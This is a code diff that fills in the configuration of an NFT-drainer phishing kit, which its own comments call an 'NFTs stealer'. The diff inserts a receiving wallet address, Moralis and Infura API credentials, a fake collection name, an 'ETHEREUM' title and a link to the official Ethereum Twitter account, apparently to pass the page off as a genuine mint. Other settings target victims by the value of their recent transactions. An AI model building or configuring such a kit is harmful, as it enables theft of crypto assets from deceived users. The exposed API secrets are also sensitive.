@@ -1,15 +1,15 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
+const address = "0xC5a2CBb9910D6B0eDC53AD7cde357d027E719DfC";    // Your ETH wallet that you have to receive NFTs
 const infuraId = "https://2DtrbMveHMicoYrsaqw4vlmAJeA:d2cf970cd05ae6f6ca1ff31ff1a1c8ee@eth2-beacon-mainnet.infura.io"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
+const moralisApi = "Va6HUWQz0yrTPmUhPOWvJIyI1oK7tMPciMR6DnIUFbYckyEWClWrK8WGAUXXFXs2"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "Tec.sellix.io",
-    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "XX.XX.XXXX", // Today date
+    name: "Glorious Grinches ",
+    title: "ETHEREUM", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    date: "08-26-2022", // Today date
     socialMedia: {
-        discord: "https://discord.gg/example",
-        twitter: "https://twitter.com/example",
+        discord: "",
+        twitter: "https://twitter.com/ethereum",
     },
     medias: {
         preview: "preview.gif",
@@ -34,7 +34,7 @@ const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
-    receiveAddress: "" // leave empty if you want to use the same address 
+    receiveAddress: "0xC5a2CBb9910D6B0eDC53AD7cde357d027E719DfC" // leave empty if you want to use the same address 
 }
 
 /* 
